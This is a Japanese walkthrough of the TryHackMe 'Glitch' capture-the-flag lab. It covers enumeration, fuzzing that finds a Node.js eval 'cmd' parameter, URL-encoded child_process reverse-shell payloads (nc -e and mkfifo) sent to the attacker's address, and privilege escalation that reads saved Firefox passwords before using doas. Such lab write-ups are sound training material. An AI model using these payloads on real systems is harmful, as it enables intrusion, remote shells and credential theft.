# GLITCH CTF

https://tryhackme.com/room/glitch

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.4.65
root@ip-10-10-113-138:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-21 07:00 GMT
Nmap scan report for 10.10.4.65
Host is up (0.0078s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:9A:5E:3B:4D:B3 (Unknown)

root@ip-10-10-113-138:~# sudo nmap -sV -p80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-21 07:03 GMT
Nmap scan report for 10.10.4.65
Host is up (0.00015s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
MAC Address: 02:9A:5E:3B:4D:B3 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

HTTP nginx だけ。

ホームページのソースを見ると、```/api/access``` にアクセスしていた。

GETすると下記トークンが返ってきた。
```
token	"dGhpc.............."
```

```shell
$ echo dGhpc.............. | base64 -d
.................
```

Cookie「token」の値を設定して更新。

```/api/items```にアクセスしてデータ取得している。

```json
{
    "sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],
    "errors":["error","error","error","error","error","error","error","error","error"],
    "deaths":["death"]
}
```

次に何をすればよいかわからない。

他のエンドポイントがないか探したが、accessしか見つからなかった。

```shell
$ dirsearch -u http://10.10.4.65/api/ --cookie='token: .................'
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                             
                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/CTF/reports/http_10.10.4.65/_api__25-03-21_04-00-23.txt

Target: http://10.10.4.65/

[04:00:23] Starting: api/                                                                                           
[04:01:06] 200 -   36B  - /api/access                                       
[04:01:06] 200 -   36B  - /api/access/                                      
                                                                             
Task Completed
```

全く分からないので、ここでウォークスルーを見る。

/api/items を POST エンドポイントとしてパラメータを探すらしい。

```shell
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -X POST -H "token: this_is_not_real" -u http://10.10.4.65/api/items?FUZZ=aaa -fr "sins"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.4.65/api/items?FUZZ=aaa
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Token: this_is_not_real
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: sins
________________________________________________

cmd                     [Status: 500, Size: 1080, Words: 55, Lines: 11, Duration: 263ms]
:: Progress: [6453/6453] :: Job [1/1] :: 158 req/sec :: Duration: [0:00:41] :: Errors: 0 ::
```

cmd パラメータがあることが分かった。  
これはわからない。

## /api/items?cmd=

id コマンドを試してみる。

```shell
$ curl -X POST http://10.10.4.65/api/items?cmd=id
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>ReferenceError: id is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)</pre>
</body>
</html>
```

Linuxコマンドではなくjavascriptのコマンドが必要と思われる。

```shell
require('child_process').exec('nc -e sh 10.2.22.182 6666')
```

URLエンコードして送ったが、不発。

```shell
$ curl -X POST http://10.10.4.65/api/items?cmd=%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%6e%63%20%2d%65%20%73%68%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%36%36%36%36%27%29
vulnerability_exploited [object Object]
```

出力されているメッセージの意味はよく分からない。

nc -e が使えない可能性を考え、下記をURLエンコードする。

```shell
require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6666 >/tmp/f')
```

```shell
$ curl -X POST http://10.10.4.65/api/items?cmd=%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%32%2e%32%32%2e%31%38%32%20%36%36%36%36%20%3e%2f%74%6d%70%2f%66%27%29
vulnerability_exploited [object Object]
```

シェル取得成功。

```shell
$ nc -nvlp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.4.65] 48466
sh: 0: can't access tty; job control turned off
$ id
uid=1000(user) gid=1000(user) groups=1000(user),30(dip),46(plugdev)
```

```shell
$ ls -al /home
total 16
drwxr-xr-x  4 root root 4096 Jan 15  2021 .
drwxr-xr-x 24 root root 4096 Jan 27  2021 ..
drwxr-xr-x  8 user user 4096 Jan 27  2021 user
drwxr-xr-x  2 v0id v0id 4096 Jan 21  2021 v0id
$ ls -al /home/user
total 48
drwxr-xr-x   8 user user  4096 Jan 27  2021 .
drwxr-xr-x   4 root root  4096 Jan 15  2021 ..
lrwxrwxrwx   1 root root     9 Jan 21  2021 .bash_history -> /dev/null
-rw-r--r--   1 user user  3771 Apr  4  2018 .bashrc
drwx------   2 user user  4096 Jan  4  2021 .cache
drwxrwxrwx   4 user user  4096 Jan 27  2021 .firefox
drwx------   3 user user  4096 Jan  4  2021 .gnupg
drwxr-xr-x 270 user user 12288 Jan  4  2021 .npm
drwxrwxr-x   5 user user  4096 Mar 21 07:00 .pm2
drwx------   2 user user  4096 Jan 21  2021 .ssh
-rw-rw-r--   1 user user    22 Jan  4  2021 user.txt
$ cat /home/user/user.txt
THM{..............}
```

ユーザーフラグゲット

## 権限昇格

気になったのは、見慣れない doas コマンドにSUIDがついていた点。

userユーザーで使用してみたが、パーミッション不足と表示された。

```shell
doas -u root bash -p
```

分からないのでウォークスルーを見た。  
Firefox のプロフィールをロードすることで、保存されたパスワードを読める。

```shell
# target
tar -cvf firefox.tar ./.firefox
```

```shell
# kali
tar -xvf ./firefox.tar

firefox --profile .firefox/b5w4643p.default-release --allow-downgrade
```

Firefoxの設定画面からパスワードを確認できた。

v0id へ昇格。

```shell
user@ubuntu:~$ su v0id
Password: 
v0id@ubuntu:/home/user$ 
```

```shell
v0id@ubuntu:/home/user$ doas -u root bash -p
Password: 
root@ubuntu:/home/user# 
```

```shell
root@ubuntu:/home/user# cat /root/root.txt
THM{...................}
```


## 振り返り

- APIエンドポイントで、メソッドを変更したうえでパラメータをファジングするという発想はなかった。
- /api/items に cmd パラメータがあるとは常識的には考えられないが、この辺は機械的に調べる心構えも必要。
- Firefox でプロフィールを読む方法を学べてよかった。
- doas は初見。SUIDがついているのには気づいていたが、user と v0id に与えられる権限の違いが分からなかった。下記のファイルを見れば v0id への昇格が必要だと判断できた。

```shell
root@ubuntu:/home/user# cat /usr/local/etc/doas.conf
permit v0id as root
root@ubuntu:/home/user# ls -al /usr/local/etc/doas.conf
-rw-r--r-- 1 root root 20 Jan 15  2021 /usr/local/etc/doas.conf
```
